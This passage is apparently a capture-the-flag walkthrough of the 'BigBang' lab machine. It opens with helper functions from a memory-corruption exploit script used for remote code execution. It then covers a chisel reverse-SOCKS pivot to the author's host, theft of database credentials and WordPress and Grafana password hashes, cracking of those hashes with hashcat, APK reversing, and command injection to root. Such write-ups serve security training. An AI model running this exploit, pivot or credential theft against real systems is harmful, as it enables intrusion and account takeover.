        msg_print()


def compress(data) -> bytes:
    """Returns data suitable for `zlib.inflate`.
    """
    # Remove 2-byte header and 4-byte checksum
    return zlib.compress(data, 9)[2:-4]


def b64(data: bytes, misalign=True) -> bytes:
    payload = base64.encode(data)
    if not misalign and payload.endswith("="):
        raise ValueError(f"Misaligned: {data}")
    return payload.encode()


def compressed_bucket(data: bytes) -> bytes:
    """Returns a chunk of size 0x8000 that, when dechunked, returns the data."""
    return chunked_chunk(data, 0x8000)


def qpe(data: bytes) -> bytes:
    """Emulates quoted-printable-encode.
    """
    return "".join(f"={x:02x}" for x in data).upper().encode()


def ptr_bucket(*ptrs, size=None) -> bytes:
    """Creates a 0x8000 chunk that reveals pointers after every step has been ran."""
    if size is not None:
        assert len(ptrs) * 8 == size
    bucket = b"".join(map(p64, ptrs))
    bucket = qpe(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = chunked_chunk(bucket)
    bucket = compressed_bucket(bucket)

    return bucket


def chunked_chunk(data: bytes, size: int = None) -> bytes:
    """Constructs a chunked representation of the given chunk. If size is given, the
    chunked representation has size `size`.
    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.
    """
    # The caller does not care about the size: let's just add 8, which is more than
    # enough
    if size is None:
        size = len(data) + 8
    keep = len(data) + len(b"\n\n")
    size = f"{len(data):x}".rjust(size - keep, "0")
    return size.encode() + b"\n" + data + b"\n"


@dataclass
class Region:
    """A memory region."""

    start: int
    stop: int
    permissions: str
    path: str

    @property
    def size(self) -> int:
        return self.stop - self.start


Exploit()
```
So basically, i just changed ```send``` and ```download``` functions, i also download the correct libc on the target machine and include it directly (i mean this is the most important changes)

Btw, you can do ```diff --color cnext_exploit.py rce.py``` to see all changes

![alt text](../assets/image_bigbang/foothold.png)

## SSH

So we are in a container, let's try to escape this

```bash
# /var/www/html/wordpress$ cat wp-config.php

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wp_password' );

/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
```
Upload chisel and pivot on ```172.17.0.1```

```bash
# on my machine
chisel server -p 9999 --socks5 --reverse &
# on the target machine
./chisel64 client 10.10.14.46:9999 R:socks &
```
Now we can access to the db 

```bash
# 'wp_password' as pass
proxychains -q mysql -h 172.17.0.1 -u 'wp_user' -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 690
Server version: 8.0.32 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```
```console
show databases;

use wordpress;

MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
|  1 | root       | $P$B...Cj1 | root          | root@bigbang.htb     | http://blog.bigbang.htb | 2024-05-31 13:06:58 |                     |           0 | root            |
|  3 | shawking   | $P$...oK./ | shawking      | shawking@bigbang.htb |                         | 2024-06-01 10:39:55 |                     |           0 | Stephen Hawking |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
```
Now we can crack the ```shawking``` password and just ssh

## Grafana DB

Enumerate and find a new db

```bash
shawking@bigbang:/opt/data$ ls -la
total 1008
drwxr-xr-x 6 root root    4096 Jan 27 19:31 .
drwxr-xr-x 4 root root    4096 Jun  5  2024 ..
drwxr--r-- 2 root root    4096 Jun  5  2024 csv
-rw-r--r-- 1 root root 1003520 Jan 27 19:31 grafana.db
drwxr--r-- 2 root root    4096 Jun  5  2024 pdf
drwxr-xr-x 2 root root    4096 Jun  5  2024 plugins
drwxr--r-- 2 root root    4096 Jun  5  2024 png
```
Download it and crack it by following [THIS GITHUB](https://github.com/iamaldi/grafana2hashcat)

```bash
python3 grafana2hashcat.py hashes.txt -o hashcat_formathash.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  hashes.txt
[+] Done! Read 1 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'hashcat_formathash.txt' file

hashcat -m 10900 hashcat_formathash.txt --wordlist /usr/share/wordlists/rockyou.txt

sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:REDACTED
```
And now we can login as ```developer``` on ssh and find an .apk in his home directory

## Reverse APK

```bash
developer@bigbang:~/android$ ls -la
total 2424
drwxrwxr-x 2 developer developer    4096 Jun  7  2024 .
drwxr-x--- 4 developer developer    4096 Jan 17 11:38 ..
-rw-rw-r-- 1 developer developer 2470974 Jun  7  2024 satellite-app.apk
```
Download it and we can "reverse" the app using ```d2j-dex2jar.sh``` and ```jadx-gui```

```bash
d2j-dex2jar.sh /workspace/bigbang/satellite-app.apk

jadx-gui satellite-app-dex2jar.jar &
```
After some enumerations we can found theses informations :

![alt text](../assets/image_bigbang/apkusername.png)

![alt text](../assets/image_bigbang/apkheader.png)

![alt text](../assets/image_bigbang/commandapk.png)

```bash
netstat -tupln

tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -
```
So we can also do a grep in the source code 

```bash
$ grep -R 9090 *
smali/q0/b.smali:    const-string v3, "http://app.bigbang.htb:9090/command"
smali/u/f.smali:    const-string v9, "http://app.bigbang.htb:9090/command"
smali/u/f.smali:    const-string v9, "http://app.bigbang.htb:9090/login"
```
So now we can just try to authenticate with developer creds

![alt text](../assets/image_bigbang/gettoken.png)

And nice we have a token, let's try to use it :

```bash
curl -X POST http://localhost:9090/command -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkxNDczNCwianRpIjoiYmM3ZmFlNWEtMjc1MC00MmI4LWI3NTMtNGIxYzg0ZTU5ZjU3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmVsb3BlciIsIm5iZiI6MTczNzkxNDczNCwiY3NyZiI6IjA2YzUzNjgwLTVhZjctNGM2OS05MjcyLWRhMzdiYjk3YWQzZSIsImV4cCI6MTczNzkxODMzNH0.AO36KBuXRYE6_8XzjL6BGwes5xbhENXcZkQvLZWmSDo" --data '{"command":"send_image", "output_file": "/tmp/"}'
{"error":"Error generating image: "}
```
Ok so the token is working but not the "command"

## PE with command injection

We can debug it with pspy64 like this 

![alt text](../assets/image_bigbang/firstdebug.png)

Ok so we can see the output, let's try a command injection 

![alt text](../assets/image_bigbang/2edebug.png)

Nice, now do the same to be root

![alt text](../assets/image_bigbang/lastpart.png)

Nice !!

If you have any questions, you can dm me on [instagram](https://instagram.com/eliott.la) or on discord at : 'ethicxz.'